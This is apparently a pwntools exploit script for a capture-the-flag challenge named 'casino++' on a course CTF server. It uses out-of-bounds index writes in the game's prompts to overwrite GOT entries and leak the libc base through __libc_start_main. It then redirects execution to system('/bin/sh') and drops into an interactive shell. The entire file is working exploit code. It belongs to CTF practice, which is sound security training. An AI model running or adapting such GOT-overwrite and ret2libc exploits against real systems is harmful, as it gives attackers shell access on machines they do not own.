from pwn import *

context.arch = 'amd64'
#r = process('./casino++-576e3f5261841f3d9d26eb68961f2cf8')
r = remote('edu-ctf.csie.org', 10176)

l = ELF('./libc.so')

pop_rdi = 0x400c03
pop_rsi_r15 = 0x400c01

libc_start_main_got = 0x601ff0
libc_off = 0x21ab0

#print(u64(flat(libc_start_main_got)))

system_off = 0x4f440
bin_sh_off = 0x1b3e9a

ret = 0x4006b9

r.sendlineafter('Your name: ', '/bin/sh\0' + '0' * 0x24)

age = '20'

r.sendlineafter('Your age: ',age)
##############casino#######################
r.sendlineafter('Chose the number 0: ', '0')
r.sendlineafter('Chose the number 1: ', '0')
r.sendlineafter('Chose the number 2: ', '0')
r.sendlineafter('Chose the number 3: ', '0')
r.sendlineafter('Chose the number 4: ', '0')
r.sendlineafter('Chose the number 5: ', '0')
r.sendlineafter('Change the number? [1:yes 0:no]: ', '1')
r.sendlineafter('Which number [1 ~ 6]: ', '-43')
r.sendlineafter('Chose the number -44: ', '4196701')

r.sendlineafter('Chose the number 0: ', '17')
r.sendlineafter('Chose the number 1: ', '54')
r.sendlineafter('Chose the number 2: ', '86')
r.sendlineafter('Chose the number 3: ', '73')
r.sendlineafter('Chose the number 4: ', '74')
r.sendlineafter('Chose the number 5: ', '70')
r.sendlineafter('Change the number? [1:yes 0:no]: ', '1')
r.sendlineafter('Which number [1 ~ 6]: ', '-42')
r.sendlineafter('Chose the number -43: ', '0')


#pause()

#################libc_start_main#################

r.sendlineafter('Chose the number 0: ', '0')
r.sendlineafter('Chose the number 1: ', '0')
r.sendlineafter('Chose the number 2: ', '0')
r.sendlineafter('Chose the number 3: ', '0')
r.sendlineafter('Chose the number 4: ', '0')
r.sendlineafter('Chose the number 5: ', '0')
r.sendlineafter('Change the number? [1:yes 0:no]: ', '1')
r.sendlineafter('Which number [1 ~ 6]: ', '13')
r.sendlineafter('Chose the number 12: ', '6299632')

r.sendlineafter('Chose the number 0: ', '17')
r.sendlineafter('Chose the number 1: ', '54')
r.sendlineafter('Chose the number 2: ', '86')
r.sendlineafter('Chose the number 3: ', '73')
r.sendlineafter('Chose the number 4: ', '74')
r.sendlineafter('Chose the number 5: ', '70')
r.sendlineafter('Change the number? [1:yes 0:no]: ', '1')
r.sendlineafter('Which number [1 ~ 6]: ', '14')
r.sendlineafter('Chose the number 13: ', '0')

###################leak###############

r.sendlineafter('Chose the number 0: ', '0')
r.sendlineafter('Chose the number 1: ', '0')
r.sendlineafter('Chose the number 2: ', '0')
r.sendlineafter('Chose the number 3: ', '0')
r.sendlineafter('Chose the number 4: ', '0')
r.sendlineafter('Chose the number 5: ', '0')
r.sendlineafter('Change the number? [1:yes 0:no]: ', '1')
r.sendlineafter('Which number [1 ~ 6]: ', '-35')
#pause()
r.sendlineafter('Chose the number -36: ', '4196096')

r.sendlineafter('Chose the number 0: ', '61')
r.sendlineafter('Chose the number 1: ', '68')
r.sendlineafter('Chose the number 2: ', '32')
r.sendlineafter('Chose the number 3: ', '22')
r.sendlineafter('Chose the number 4: ', '69')
r.sendlineafter('Chose the number 5: ', '20')
r.sendlineafter('Change the number? [1:yes 0:no]: ', '1')
r.sendlineafter('Which number [1 ~ 6]: ', '-34')
#pause()
r.sendlineafter('Chose the number -35: ', '0')



#pause()

base = u64(r.recv(6) + '\0\0') - libc_off
success('base -> %s' %hex(base))

system = base + system_off
bin_sh = base + bin_sh_off

print(hex(system))
print(hex(bin_sh))

system_first = system / 0x100000000
system_last = system - (system_first * 0x100000000)
bin_sh_first = bin_sh / 0x100000000
bin_sh_last = bin_sh - (bin_sh_first * 0x100000000)

print(system_first)
print(system_last)
print(bin_sh_first)
print(bin_sh_last)


#r.interactive()

#################bin_sh#################

r.sendlineafter('Chose the number 0: ', '0')
r.sendlineafter('Chose the number 1: ', '0')
r.sendlineafter('Chose the number 2: ', '0')
r.sendlineafter('Chose the number 3: ', '0')
r.sendlineafter('Chose the number 4: ', '0')
r.sendlineafter('Chose the number 5: ', '0')
r.sendlineafter('Change the number? [1:yes 0:no]: ', '1')
r.sendlineafter('Which number [1 ~ 6]: ', '13')
r.sendlineafter('Chose the number 12: ', '6299888')
#pause()

r.sendlineafter('Chose the number 0: ', '22')
r.sendlineafter('Chose the number 1: ', '67')
r.sendlineafter('Chose the number 2: ', '58')
r.sendlineafter('Chose the number 3: ', '53')
r.sendlineafter('Chose the number 4: ', '74')
r.sendlineafter('Chose the number 5: ', '3')
r.sendlineafter('Change the number? [1:yes 0:no]: ', '1')
r.sendlineafter('Which number [1 ~ 6]: ', '14')
#pause()
r.sendlineafter('Chose the number 13: ', '0')
#r.interactive()

###################system###############

r.sendlineafter('Chose the number 0: ', '0')
r.sendlineafter('Chose the number 1: ', '0')
r.sendlineafter('Chose the number 2: ', '0')
r.sendlineafter('Chose the number 3: ', '0')
r.sendlineafter('Chose the number 4: ', '0')
r.sendlineafter('Chose the number 5: ', '0')
r.sendlineafter('Change the number? [1:yes 0:no]: ', '1')
r.sendlineafter('Which number [1 ~ 6]: ', '-35')
#pause()
r.sendlineafter('Chose the number -36: ', str(system_last))

r.sendlineafter('Chose the number 0: ', '97')
r.sendlineafter('Chose the number 1: ', '97')
r.sendlineafter('Chose the number 2: ', '82')
r.sendlineafter('Chose the number 3: ', '29')
r.sendlineafter('Chose the number 4: ', '81')
r.sendlineafter('Chose the number 5: ', '31')
r.sendlineafter('Change the number? [1:yes 0:no]: ', '1')
r.sendlineafter('Which number [1 ~ 6]: ', '-34')
pause()
r.sendlineafter('Chose the number -35: ', str(system_first))


r.interactive()

